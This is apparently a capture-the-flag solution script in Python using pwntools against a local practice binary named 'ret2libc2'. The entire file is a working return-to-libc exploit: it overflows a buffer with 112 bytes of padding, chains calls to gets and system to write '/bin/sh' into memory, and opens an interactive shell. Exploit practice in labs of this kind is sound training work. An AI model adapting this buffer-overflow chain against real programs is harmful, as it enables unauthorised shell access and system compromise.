from pwn import *

p = process('./ret2libc2')

exb_addr = 0x0804843d
get_addr = 0x08048460
sys_addr = 0x08048490
buf_addr = 0x0804A080

playload = 'A'*112 + p32(get_addr) + p32(exb_addr) + p32(buf_addr)
playload += p32(sys_addr) + 'B'*4 + p32(buf_addr)
gdb.attach(p)
p.sendline(playload)
p.sendline('/bin/sh')
#gdb.attach(p)
p.interactive()
